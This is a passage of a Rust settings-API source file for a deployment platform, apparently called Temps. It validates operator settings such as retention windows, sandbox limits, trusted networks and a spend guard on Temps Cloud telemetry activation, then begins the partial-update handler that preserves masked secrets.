/// prefix into a Dockerfile at build time, but rejecting here means an
/// operator gets an immediate 400 explaining why, instead of the prefix
/// silently never applying to any build. Reuses `temps_core`'s allowlist
/// rather than re-deriving it, so the write-time check and the build-time
/// check can never drift apart.
fn sanitize_registry_mirror_prefix(prefix: Option<String>) -> Result<Option<String>, Problem> {
    let Some(raw) = prefix else {
        return Ok(None);
    };

    let trimmed = raw.trim().trim_end_matches('/').to_string();
    if trimmed.is_empty() {
        return Ok(None);
    }

    if !temps_core::registry_prefix::is_valid_registry_prefix(&trimmed) {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .title("Invalid Registry Mirror Prefix")
            .detail(
                "registry_mirror_prefix may only contain letters, digits, '.', '-', '_', ':' and '/'"
                    .to_string(),
            )
            .build());
    }

    Ok(Some(trimmed))
}

fn validate_observability_compression(
    compression: &ObservabilityCompressionSettings,
) -> Result<(), Problem> {
    if !(1..=720).contains(&compression.proxy_logs_after_hours) {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .detail("observability_compression.proxy_logs_after_hours must be between 1 and 720")
            .build());
    }
    if !(1..=2160).contains(&compression.otel_spans_after_hours) {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .detail("observability_compression.otel_spans_after_hours must be between 1 and 2160")
            .build());
    }
    Ok(())
}

/// Reject a chat turn timeout outside the supported range.
///
/// The runtime clamps on read, so an out-of-range value could never break the
/// chat — but storing one means the settings API echoes back a number that is
/// not what is in effect, and the form then shows the operator a limit that
/// isn't real. Rejecting keeps the stored value and the effective value the
/// same thing, which is the only way the page can be trusted.
fn validate_ai_chat_limits(limits: &AiChatLimitsSettings) -> Result<(), Problem> {
    let min = AiChatLimitsSettings::MIN_TURN_TIMEOUT_SECS;
    let max = AiChatLimitsSettings::MAX_TURN_TIMEOUT_SECS;
    if !(min..=max).contains(&limits.turn_timeout_secs) {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .title("Validation Error")
            .detail(format!(
                "ai_chat_limits.turn_timeout_secs must be between {min} and {max} seconds \
                 (got {})",
                limits.turn_timeout_secs
            ))
            .build());
    }
    Ok(())
}

fn validate_ai_workspace_file_limits(
    limits: &AiWorkspaceFileLimitsSettings,
) -> Result<(), Problem> {
    let invalid = [
        (
            "max_files_per_upload",
            u64::from(limits.max_files_per_upload),
            1,
            100,
        ),
        (
            "max_file_size_mb",
            u64::from(limits.max_file_size_mb),
            1,
            32,
        ),
        (
            "max_upload_size_mb",
            u64::from(limits.max_upload_size_mb),
            1,
            32,
        ),
        (
            "max_workspace_size_mb",
            u64::from(limits.max_workspace_size_mb),
            1,
            2_048,
        ),
        (
            "max_workspace_entries",
            u64::from(limits.max_workspace_entries),
            1,
            50_000,
        ),
        (
            "max_text_preview_kb",
            u64::from(limits.max_text_preview_kb),
            1,
            1_024,
        ),
        (
            "max_image_preview_size_mb",
            u64::from(limits.max_image_preview_size_mb),
            1,
            16,
        ),
        (
            "max_download_size_mb",
            u64::from(limits.max_download_size_mb),
            1,
            32,
        ),
    ]
    .into_iter()
    .find(|(_, value, min, max)| !(*min..=*max).contains(value));

    if let Some((name, value, min, max)) = invalid {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .title("Validation Error")
            .detail(format!(
                "ai_workspace_file_limits.{name} must be between {min} and {max} (got {value})"
            ))
            .build());
    }
    if limits.max_file_size_mb > limits.max_upload_size_mb {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .title("Validation Error")
            .detail("ai_workspace_file_limits.max_file_size_mb cannot exceed max_upload_size_mb")
            .build());
    }
    if limits.max_image_preview_size_mb > limits.max_download_size_mb {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .title("Validation Error")
            .detail(
                "ai_workspace_file_limits.max_image_preview_size_mb cannot exceed max_download_size_mb",
            )
            .build());
    }
    Ok(())
}

/// Reject a request-timeout ceiling outside the supported range, or a
/// nonzero default timeout outside `1..=max`. `0` is accepted as the
/// explicit "no timeout" state — see the loop below.
///
/// The proxy already clamps a stored out-of-range ceiling on read
/// (`RequestTimeoutSettings::ceiling`) — but storing one anyway would mean
/// the settings API echoes back a ceiling that isn't actually enforced, and
/// the form would show the operator a limit that isn't real.
fn validate_request_timeouts(timeouts: &RequestTimeoutSettings) -> Result<(), Problem> {
    let min = RequestTimeoutSettings::MIN_CEILING_SECS;
    let max = RequestTimeoutSettings::MAX_CEILING_SECS;
    if !(min..=max).contains(&timeouts.max_request_timeout_seconds) {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .title("Validation Error")
            .detail(format!(
                "request_timeouts.max_request_timeout_seconds must be between {min} and {max} \
                 seconds (got {})",
                timeouts.max_request_timeout_seconds
            ))
            .build());
    }
    // `0` is the valid, default "no timeout" state for each traffic class —
    // opt-in only, so an existing app with no timeout configured keeps
    // working unchanged. A nonzero value must still be a sane duration.
    for (name, value) in [
        (
            "default_http_timeout_seconds",
            timeouts.default_http_timeout_seconds,
        ),
        (
            "default_sse_idle_timeout_seconds",
            timeouts.default_sse_idle_timeout_seconds,
        ),
        (
            "default_websocket_idle_timeout_seconds",
            timeouts.default_websocket_idle_timeout_seconds,
        ),
    ] {
        if value != 0 && !(1..=max).contains(&value) {
            return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
                .title("Validation Error")
                .detail(format!(
                    "request_timeouts.{name} must be 0 (no timeout) or between 1 and {max} \
                     seconds (got {value})"
                ))
                .build());
        }
    }
    Ok(())
}

/// Operator ceilings for sandbox create requests. A ceiling below what the
/// runtime can enforce (a CPU quota that truncates to none, memory under
/// Docker's 6 MB floor) or a per-user cap of zero would make every create
/// fail, so the save is refused instead of storing a setting that only
/// breaks the next request.
fn validate_sandbox_limits(sandbox: &temps_core::AgentSandboxSettings) -> Result<(), Problem> {
    let reject = |detail: String| {
        Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .title("Invalid Sandbox Limit")
            .detail(detail)
            .build())
    };
    if let Some(cpu) = sandbox.max_cpu_limit {
        if !cpu.is_finite() || cpu < 0.01 {
            return reject(format!(
                "agent_sandbox.max_cpu_limit must be at least 0.01 cores, or null for the built-in ceiling (got {cpu})"
            ));
        }
    }
    if let Some(memory) = sandbox.max_memory_limit_mb {
        if memory < 6 {
            return reject(format!(
                "agent_sandbox.max_memory_limit_mb must be at least 6 MB, or null for the built-in ceiling (got {memory})"
            ));
        }
    }
    if let Some(pids) = sandbox.max_pids_limit {
        if pids < 1 {
            return reject(format!(
                "agent_sandbox.max_pids_limit must be at least 1, or null for the built-in ceiling (got {pids})"
            ));
        }
    }
    if sandbox.max_sandboxes_per_user == Some(0) {
        return reject(
            "agent_sandbox.max_sandboxes_per_user must be at least 1, or null for no cap"
                .to_string(),
        );
    }
    Ok(())
}

/// Host-default sandbox backend accepted in platform settings. Selecting a
/// backend this host can't run is allowed (the settings page shows its
/// onboarding state); the agents plugin only routes to registered backends.
fn validate_sandbox_backend(backend: Option<&str>) -> Result<(), Problem> {
    let Some(backend) = backend.map(str::trim) else {
        return Ok(());
    };
    if matches!(backend, "docker" | "firecracker" | "microsandbox") {
        return Ok(());
    }
    Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
        .title("Invalid Sandbox Backend")
        .detail(format!(
            "sandbox_backend must be \"docker\", \"firecracker\" or \"microsandbox\", got \"{}\"",
            backend
        ))
        .build())
}

fn validate_monitoring_settings(monitoring: &MonitoringSettings) -> Result<(), Problem> {
    if monitoring.scrape_interval_secs < 15 {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .detail("monitoring.scrape_interval_secs must be >= 15")
            .build());
    }
    if !(1..=30).contains(&monitoring.retention_raw_days) {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .detail("monitoring.retention_raw_days must be between 1 and 30")
            .build());
    }
    if !(7..=365).contains(&monitoring.retention_hourly_days) {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .detail("monitoring.retention_hourly_days must be between 7 and 365")
            .build());
    }
    if !(1..=10).contains(&monitoring.retention_daily_years) {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .detail("monitoring.retention_daily_years must be between 1 and 10")
            .build());
    }
    // `monitoring.clickhouse_url` is legacy, optional config: the runtime
    // builds the ClickHouse metrics store from the server's TEMPS_CLICKHOUSE_*
    // env configuration (`build_ch_metrics_store`), never from this setting.
    // Requiring it when store == ClickHouse made the store unswitchable from
    // the UI (which has no URL field) even on servers where ClickHouse is
    // fully configured. Validate the URL only when one is supplied; the
    // env-not-configured case is surfaced by `effective_metrics_store` and
    // the console's mismatch warning instead of a save-time rejection.
    if let Some(url) = monitoring
        .clickhouse_url
        .as_deref()
        .filter(|u| !u.trim().is_empty())
    {
        if url::Url::parse(url).is_err() {
            return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
                .detail("monitoring.clickhouse_url is not a valid URL")
                .build());
        }
    }
    Ok(())
}

/// Reject a bulk-activation anomaly factor outside the supported range.
///
/// `effective_bulk_anomaly_factor` clamps on read, so an out-of-range value
/// could never reach the worker — but silently clamping a write hides the
/// operator's mistake behind a settings page that echoes back `1000` while the
/// instance is really running at 50. Worse, it hides it in the one direction
/// that costs money: an operator who believes they widened the guard to 1000×
/// and did not is being lied to about their own spend ceiling. Rejecting keeps
/// the stored value and the effective value the same thing, which is the only
/// way the page can be trusted.
fn validate_bulk_activation_guards(cloud: &CloudSettings) -> Result<(), Problem> {
    let Some(factor) = cloud.telemetry_bulk_anomaly_factor else {
        // Unset is the documented default, not an out-of-range value.
        return Ok(());
    };
    if !factor.is_finite()
        || !(MIN_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR..=MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR)
            .contains(&factor)
    {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .title("Validation Error")
            .detail(format!(
                "cloud.telemetry_bulk_anomaly_factor must be between \
                 {MIN_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR} and \
                 {MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR} (got {factor}). This is the multiple \
                 of its own estimate a project may ship before a bulk Temps Cloud activation \
                 stops it, so it is a tuning range and not an off switch. A project that needs a \
                 wider margin than {MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR}x should be activated \
                 from the Cloud telemetry status card, which estimates it and shows the number \
                 before anything is sent."
            ))
            .value(
                "minimum",
                MIN_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR.to_string(),
            )
            .value(
                "maximum",
                MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR.to_string(),
            )
            .build());
    }
    Ok(())
}

/// Confine *widening* the bulk-activation money guard to an instance operator.
///
/// Asymmetric on purpose, and the asymmetry is the whole point:
///
/// - **Narrowing** it (a smaller factor, a stricter guard) makes an activation
///   more likely to stop early with its cursor intact. The worst outcome is a
///   retry click, so ordinary `SettingsWrite` is the right bar — and requiring
///   more would mean an operator who spots a runaway bill cannot tighten the
///   guard without finding an administrator first.
/// - **Widening** it raises the ceiling on what a purchase-triggered activation
///   may spend with nobody confirming it. That is the same authority the
///   operator bulk-activation endpoints already reserve to an instance
///   administrator (`OtelWrite` + instance admin), and it would be incoherent
///   for `POST /bulk-jobs` to demand it while a `SettingsWrite` holder could
///   raise the ceiling on the very same spend through the settings document.
///
/// Scoped to this one field rather than to the endpoint: tightening the whole
/// settings PUT to instance-admin would break every unrelated caller that
/// legitimately holds `SettingsWrite`.
fn authorize_bulk_activation_guard_change(
    auth: &temps_auth::AuthContext,
    previous: BulkActivationGuards,
    next: BulkActivationGuards,
) -> Result<(), Problem> {
    if next.anomaly_factor <= previous.anomaly_factor || auth.is_instance_admin() {
        return Ok(());
    }
    Err(ErrorBuilder::new(StatusCode::FORBIDDEN)
        .type_("https://temps.sh/probs/insufficient-permissions")
        .title("Instance Administrator Required")
        .detail(format!(
            "Raising cloud.telemetry_bulk_anomaly_factor from {} to {} widens the byte budget a \
             bulk Temps Cloud telemetry activation may spend on a project before it stops, on a \
             path that spends without a human confirming it. Loosening that guard is restricted \
             to an instance administrator, the same bar the bulk activation endpoints \
             themselves use. Lowering it, or leaving it alone, needs only settings:write.",
            previous.anomaly_factor, next.anomaly_factor
        ))
        .value("required_role", temps_auth::Role::PlatformAdmin.to_string())
        .value("user_role", auth.effective_role.to_string())
        .value(
            "current_anomaly_factor",
            previous.anomaly_factor.to_string(),
        )
        .value("requested_anomaly_factor", next.anomaly_factor.to_string())
        .build())
}

fn validate_analytics_retention(
    retention: &temps_core::AnalyticsRetentionSettings,
) -> Result<(), Problem> {
    if let Some((field, days)) = retention.out_of_range() {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .detail(format!(
                "analytics_retention.{field} must be between {} and {} days (got {days}); \
                 use null to keep the data",
                temps_core::MIN_ANALYTICS_RETENTION_DAYS,
                temps_core::MAX_ANALYTICS_RETENTION_DAYS,
            ))
            .build());
    }
    Ok(())
}

fn validate_observability_retention(
    retention: &ObservabilityRetentionSettings,
) -> Result<(), Problem> {
    let values = [
        ("proxy_logs_days", retention.proxy_logs_days),
        ("otel_spans_days", retention.otel_spans_days),
        ("otel_logs_days", retention.otel_logs_days),
        ("otel_metrics_days", retention.otel_metrics_days),
        ("container_logs_days", retention.container_logs_days),
    ];
    for (field, days) in values {
        if !(1..=3650).contains(&days) {
            return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
                .detail(format!(
                    "observability_retention.{field} must be between 1 and 3650"
                ))
                .build());
        }
    }
    Ok(())
}

/// Reject out-of-range geolocation knobs instead of silently clamping them, so
/// an admin who types `0` is told the value was not applied rather than
/// discovering later that the job runs hourly.
///
/// `None` is valid and means "use the default", which is how the field is
/// cleared.
/// Collected-log budgets (ADR-046): the read cache and the per-container
/// head buffer are applied at runtime, so an absurd value must be rejected
/// here rather than silently clamped later.
fn validate_container_log_budgets(logs: &temps_core::ContainerLogSettings) -> Result<(), Problem> {
    if !(64..=1_048_576).contains(&logs.cache_mb) {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .detail("container_logs.cache_mb must be between 64 and 1048576 (1 TiB)")
            .build());
    }
    if !(1..=256).contains(&logs.head_buffer_mb) {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .detail("container_logs.head_buffer_mb must be between 1 and 256")
            .build());
    }
    if logs.ingest_lines_per_sec > temps_core::ContainerLogSettings::MAX_INGEST_LINES_PER_SEC {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .detail(format!(
                "container_logs.ingest_lines_per_sec must be between 0 (no limit) and {}, got {}",
                temps_core::ContainerLogSettings::MAX_INGEST_LINES_PER_SEC,
                logs.ingest_lines_per_sec
            ))
            .build());
    }
    if logs.ingest_kib_per_sec > temps_core::ContainerLogSettings::MAX_INGEST_KIB_PER_SEC {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .detail(format!(
                "container_logs.ingest_kib_per_sec must be between 0 (no limit) and {}, got {}",
                temps_core::ContainerLogSettings::MAX_INGEST_KIB_PER_SEC,
                logs.ingest_kib_per_sec
            ))
            .build());
    }
    Ok(())
}

/// Upper bound on trusted private network entries. A handful of CIDRs covers
/// any real LAN/overlay layout; the cap keeps the per-request check trivial.
const MAX_TRUSTED_PRIVATE_NETWORKS: usize = 64;

/// Validate the trusted private networks and rewrite them to their canonical
/// CIDR form (`10.1.2.3/16` becomes `10.1.0.0/16`, a bare address gets `/32`
/// or `/128`), dropping blanks and duplicates so the stored list and the
/// audit record show exactly what is enforced.
fn normalize_trusted_private_networks(networks: &mut Vec<String>) -> Result<(), Problem> {
    let parsed =
        temps_core::url_validation::parse_trusted_private_networks(networks).map_err(|error| {
            ErrorBuilder::new(StatusCode::BAD_REQUEST)
                .title("Invalid Trusted Private Network")
                .detail(format!(
                    "trusted_private_networks: {error}. Nothing was saved."
                ))
                .build()
        })?;

    let mut normalized: Vec<String> = Vec::with_capacity(parsed.len());
    for network in parsed {
        let canonical = network.to_string();
        if !normalized.contains(&canonical) {
            normalized.push(canonical);
        }
    }

    if normalized.len() > MAX_TRUSTED_PRIVATE_NETWORKS {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .title("Too Many Trusted Private Networks")
            .detail(format!(
                "trusted_private_networks has {} entries; at most {} are allowed. Use \
                 broader CIDRs (for example 10.0.0.0/8) instead of individual hosts.",
                normalized.len(),
                MAX_TRUSTED_PRIVATE_NETWORKS
            ))
            .build());
    }

    *networks = normalized;
    Ok(())
}

fn validate_geo_settings(geo: &temps_core::GeoSettings) -> Result<(), Problem> {
    if let Some(hours) = geo.refresh_interval_hours {
        if !(temps_core::MIN_GEO_REFRESH_INTERVAL_HOURS
            ..=temps_core::MAX_GEO_REFRESH_INTERVAL_HOURS)
            .contains(&hours)
        {
            return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
                .title("Invalid Geolocation Refresh Interval")
                .detail(format!(
                    "geo.refresh_interval_hours must be between {} and {} (got {}); leave it \
                     empty to use the default of {} hours",
                    temps_core::MIN_GEO_REFRESH_INTERVAL_HOURS,
                    temps_core::MAX_GEO_REFRESH_INTERVAL_HOURS,
                    hours,
                    temps_core::DEFAULT_GEO_REFRESH_INTERVAL_HOURS,
                ))
                .build());
        }
    }

    if let Some(days) = geo.stale_lookup_days {
        if !(temps_core::MIN_GEO_STALE_LOOKUP_DAYS..=temps_core::MAX_GEO_STALE_LOOKUP_DAYS)
            .contains(&days)
        {
            return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
                .title("Invalid Geolocation Staleness Window")
                .detail(format!(
                    "geo.stale_lookup_days must be between {} and {} (got {}); leave it empty to \
                     use the default of {} days",
                    temps_core::MIN_GEO_STALE_LOOKUP_DAYS,
                    temps_core::MAX_GEO_STALE_LOOKUP_DAYS,
                    days,
                    temps_core::DEFAULT_GEO_STALE_LOOKUP_DAYS,
                ))
                .build());
        }
    }

    Ok(())
}

/// Normalize the edge target: trim whitespace and treat an empty string as
/// `None` so an operator clearing the field disables DNS record sync.
fn normalize_edge_target(settings: &mut AppSettings) {
    if let Some(value) = settings.edge_target.take() {
        let trimmed = value.trim().to_string();
        if !trimmed.is_empty() {
            settings.edge_target = Some(trimmed);
        }
    }
}

/// Fill only absent object fields; arrays, scalars and explicit nulls are
/// replacement values supplied by the caller, never silently merged.
fn fill_omitted_settings(submitted: &mut serde_json::Value, stored: serde_json::Value) {
    if let (Some(submitted), serde_json::Value::Object(stored)) =
        (submitted.as_object_mut(), stored)
    {
        for (key, value) in stored {
            match submitted.get_mut(&key) {
                Some(submitted_value) => fill_omitted_settings(submitted_value, value),
                None => {
                    submitted.insert(key, value);
                }
            }
        }
    }
}

/// Update application settings
#[utoipa::path(
    tag = "Settings",
    put,
    path = "/settings",
    request_body = AppSettings,
    responses(
        (status = 200, description = "Settings updated successfully", body = SettingsUpdateResponse),
        (status = 401, description = "Unauthorized"),
        (status = 400, description = "Bad request - invalid settings"),
        (status = 500, description = "Internal server error")
    ),
    security(
        ("bearer_auth" = [])
    )
)]
async fn update_settings(
    RequireAuth(auth): RequireAuth,
    State(app_state): State<Arc<SettingsState>>,
    Extension(metadata): Extension<RequestMetadata>,
    Json(mut body): Json<serde_json::Value>,
) -> Result<impl IntoResponse, Problem> {
    permission_guard!(auth, SettingsWrite);

    // Taken as raw JSON first, and only then turned into an `AppSettings`,
    // because which `cloud.*` keys the client sent is information
    // `#[serde(default)]` destroys: it cannot be recovered from the
    // deserialized document. See `CloudFieldsSent`.
    // Dedicated SystemAdmin plugin endpoint owns this consent. Strip it from
    // generic SettingsWrite requests, including full-document round trips.
    discard_plugin_reporting_consent(&mut body);
    // Capture presence before omitted fields are filled from the cached GET.
    let trusted_private_networks_sent = body.get("trusted_private_networks").is_some();
    let cloud_fields_sent = CloudFieldsSent::from_settings_body(&body);
    let node_failover_sent =
        SettingsWritePresence::from_settings_body(&body).node_failover_after_secs_sent();
    let mut settings: AppSettings =
        serde_path_to_error::deserialize(body.clone()).map_err(|e| {
            let field = e.path().to_string();
            ErrorBuilder::new(StatusCode::BAD_REQUEST)
                .title("Invalid Settings Payload")
                .detail(format!(
                    "The settings document could not be read at `{}`: {}. Nothing was saved.",
                    field,
                    e.into_inner()
                ))
                .value("field", field)
                .build()
        })?;

    // ADR-042 §6.3: the money guard on bulk Temps Cloud activation. Validated,
    // authorized and captured here — before any other field is touched — for
    // three reasons that all need the *previous* value, which a completed save
    // can no longer produce: an out-of-range factor is refused rather than
    // silently clamped, widening it needs the same instance-admin bar the bulk
    // activation endpoints use, and the change is recorded as its own audit
    // event with both sides.
    //
    // Validated against what the client actually sent, before anything is
    // merged in from the DB: a stored value that predates a range change, or
    // was hand-edited, must not make every unrelated save fail with a message
    // about a field the client never mentioned. `effective_*` clamps such a row
    // on read.
    //
    // A read failure aborts the save. Proceeding would mean applying a
    // possibly-widened spend ceiling with neither the check nor the record that
    // are supposed to accompany it.
    validate_bulk_activation_guards(&settings.cloud)?;
    let stored_settings = match app_state.config_service.get_settings().await {
        Ok(current) => current,
        Err(e) => {
            error!(
                "Could not read the current Temps Cloud bulk activation guard settings; \
                 aborting settings save: {}",
                e
            );
            return Err(ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
                .title("Settings Save Aborted")
                .detail(format!(
                    "Could not read the current Temps Cloud settings, so a change to the bulk \
                     activation guards could be neither authorized nor recorded, and the fields \
                     this client did not send could not be preserved; the save was aborted \
                     rather than applied unchecked. Retry the save; if this persists, check \
                     database connectivity: {}",
                    e
                ))
                .build());
        }
    };

    // PUT accepts partial documents: omitted fields retain their stored values,
    // including nested settings. Explicit nulls still go through typed validation.
    let stored_body = serde_json::to_value(&stored_settings).map_err(|error| {
        ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
            .title("Settings Save Aborted")
            .detail(format!(
                "Could not serialize current settings for a partial update: {error}"
            ))
            .build()
    })?;
    fill_omitted_settings(&mut body, stored_body);
    settings = serde_path_to_error::deserialize(body).map_err(|error| {
        ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .title("Invalid Settings Payload")
            .detail(format!(
                "Could not read merged settings at `{}`: {}. Nothing was saved.",
                error.path(),
                error.inner()
            ))
            .build()
    })?;

    // Merge the `cloud` block *before* the guard comparison below, not after:
    // a save that never mentioned `cloud` is not a request to widen the spend
    // guard back to its default, and must be neither refused as one (403) nor
    // recorded as one in the audit log.
    preserve_cloud_settings_not_sent_by_every_client(
        &mut settings,
        &stored_settings,
        cloud_fields_sent,
    );

    // Checked on the merged document so a partial save that turns on one
    // provider while the other is stored as on is still caught.
    validate_delivery_defaults(&app_state.config_service, &stored_settings, &settings).await?;

    let previous_bulk_guards = BulkActivationGuards::from(&stored_settings.cloud);
    let next_bulk_guards = BulkActivationGuards::from(&settings.cloud);
    authorize_bulk_activation_guard_change(&auth, previous_bulk_guards, next_bulk_guards)?;

    let previous_trust_loopback_forwarded_ip = stored_settings.trust_loopback_forwarded_ip();
    let previous_public_ingress_url = stored_settings.public_ingress_url.clone();

    // Whether this request asked to store, rotate, or clear the MaxMind
    // license key. Set inside the preservation block below (where the
    // write-only plaintext field is still intact) and consumed twice: by the
    // service, to decide whether the locked row's ciphertext wins, and by the
    // dedicated audit record after a successful save.
    // Left uninitialized deliberately: the only path that skips the block
    // below aborts the save, so there is no default to fall back to.
    let geo_license_key_intent: temps_core::GeoLicenseKeyIntent;

    // Merge sensitive sandbox/gateway/multi-node fields back from DB. The GET
    // endpoint strips encrypted credentials, shared secrets, and token hashes,
    // so any client round-trip would otherwise wipe them on save. We always
    // preserve them from the DB. Provider credentials are only changed through
    // the dedicated credential endpoint, never through this bulk PUT.
    match app_state.config_service.get_settings().await {
        Ok(current_settings) => {
            // `console_version` is self-recorded state, written only by a starting
            // console process (ADR-017 Phase 3 skew detection) and never exposed in
            // the GET response. Always restore it from the DB so an operator's
            // settings save can neither overwrite it (spoofing the skew check) nor
            // silently wipe it (a GET-then-PUT round-trip carries no value →
            // `#[serde(default)]` → None). Done first, before any field is moved
            // out of `current_settings` below.
            preserve_self_recorded_fields(&mut settings, &current_settings);
            preserve_omitted_security_fields(&mut settings, &current_settings);
            settings.plugin_installation_reporting_enabled =
                current_settings.plugin_installation_reporting_enabled;
            // Anonymous product telemetry consent is owned by the SystemAdmin-only
            // `PATCH /settings/telemetry` endpoint (audit-logged there).
            settings.anonymous_telemetry_enabled = current_settings.anonymous_telemetry_enabled;
            // The `cloud` block was already merged, further up: the ADR-042
            // guard authorization depends on the merged value, so it cannot
            // wait until here.

            // The dedicated credential endpoint is the only write path for
            // encrypted provider secrets and native-verification proof.
            preserve_provider_credential_proof(&mut settings, &current_settings);
            // Geo: restore the refresh metadata only the refresh job may
            // write, then turn a newly submitted MaxMind license key into
            // ciphertext (blank preserves the stored one, exactly like the
            // email-provider credential fields). The plaintext field is
            // `skip_serializing`, so it cannot reach the settings row even if
            // this is ever bypassed — but it is consumed here regardless.
            //
            // The intent is captured *before* the write-only fields are
            // consumed and passed down to the service, which re-applies it
            // against the row it locks: `current_settings` here comes from the
            // 5s-cached snapshot, so the ciphertext preserved below may
            // already be stale by the time the row is locked.
            geo_license_key_intent = settings.geo.license_key_intent();
            settings.geo.preserve_recorded_state(&current_settings.geo);
            settings
                .geo
                .apply_license_key_update(
                    &current_settings.geo,
                    app_state.encryption_service.as_ref(),
                )
                .map_err(|error| {
                    // The error reports a cipher/encoding failure and never
                    // echoes its input, so it is safe to surface verbatim.
                    tracing::error!(%error, "Failed to encrypt the submitted MaxMind license key");
                    ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
                        .title("License Key Not Saved")
                        .detail(format!(
                            "The MaxMind license key could not be encrypted, so the settings \
                             were not saved: {error}"
                        ))
                        .build()
                })?;
            preserve_masked_secrets(&mut settings, &current_settings, node_failover_sent);
        }
        Err(e) => {
            // Abort rather than proceed: the preservation block above did not
            // run, so saving now would silently overwrite every masked
            // sensitive field the client legitimately omitted (ClickHouse DSN,
            // preview-gateway shared_secret, join token hash, AI provider
            // credentials) with empty values. A failed save the operator can
            // retry is strictly better than an unannounced credential wipe.
            tracing::error!(
                "Could not fetch current settings to preserve sensitive fields; \
                 aborting settings save: {}",
                e
            );
            return Err(ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
                .title("Settings Save Aborted")
                .detail(format!(
                    "Could not load current settings to preserve masked sensitive \
                     fields (ClickHouse DSN, shared secrets, provider credentials); \
                     the save was aborted to avoid wiping them. Retry the save; if \
                     this persists, check database connectivity: {}",
                    e
                ))
                .build());
        }
    }

    validate_sandbox_backend(settings.agent_sandbox.sandbox_backend.as_deref())?;
    validate_sandbox_limits(&settings.agent_sandbox)?;

    validate_monitoring_settings(&settings.monitoring)?;
    validate_ai_chat_limits(&settings.ai_chat_limits)?;
    validate_ai_workspace_file_limits(&settings.ai_workspace_file_limits)?;
    validate_request_timeouts(&settings.request_timeouts)?;

    validate_observability_compression(&settings.observability_compression)?;
    validate_observability_retention(&settings.observability_retention)?;
    validate_analytics_retention(&settings.analytics_retention)?;
    validate_container_log_budgets(&settings.container_logs)?;
    validate_geo_settings(&settings.geo)?;
    normalize_trusted_private_networks(&mut settings.trusted_private_networks)?;

    settings.external_url = sanitize_optional_url("External", settings.external_url)?;
    settings.internal_url = sanitize_optional_url("Internal", settings.internal_url)?;
    settings.public_ingress_url = validate_public_ingress_url(
        &app_state.config_service,
        app_state.route_table_refresher.as_deref(),
        settings.public_ingress_url.take(),
        previous_public_ingress_url.as_deref(),
        &settings.preview_domain,
    )
    .await?;
    let next_public_ingress_url = settings.public_ingress_url.clone();
    settings.registry_mirror_prefix =
        sanitize_registry_mirror_prefix(settings.registry_mirror_prefix)?;
    // Validate and sanitize external_url
    if let Some(ref mut ext_url) = settings.external_url {
        *ext_url = ext_url.trim().to_string();
        *ext_url = ext_url.trim_end_matches('/').to_string();
        if !ext_url.starts_with("http://") && !ext_url.starts_with("https://") {
            return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
                .detail("External URL must start with http:// or https://")
                .build());
        }
        if ext_url.contains('#') || ext_url.contains('?') {
            return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
                .detail("External URL must not contain '#' or '?' characters")
                .build());
        }
        if url::Url::parse(ext_url).is_err() {
            return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
                .detail("External URL is not a valid URL")
                .build());
        }
    }

    // Validate and sanitize internal_url (same rules as external_url)
    if let Some(ref mut int_url) = settings.internal_url {
        *int_url = int_url.trim().trim_end_matches('/').to_string();
        if int_url.is_empty() {
            settings.internal_url = None;
        } else {
            if !int_url.starts_with("http://") && !int_url.starts_with("https://") {
                return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
                    .detail("Internal URL must start with http:// or https://")
                    .build());
            }
            if int_url.contains('#') || int_url.contains('?') {
                return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
                    .detail("Internal URL must not contain '#' or '?' characters")
                    .build());
            }
            if url::Url::parse(int_url).is_err() {
                return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
                    .detail("Internal URL is not a valid URL")
                    .build());
            }
        }
    }

    normalize_edge_target(&mut settings);

    let next_trust_loopback_forwarded_ip = settings.trust_loopback_forwarded_ip();
    let previous_clickhouse_compression = stored_settings.clickhouse.compression;
    let next_clickhouse_compression = settings.clickhouse.compression;
    let trusted_private_networks_intent = if trusted_private_networks_sent {
        TrustedPrivateNetworksIntent::Replace(settings.trusted_private_networks.clone())
    } else {
        TrustedPrivateNetworksIntent::Unchanged
    };

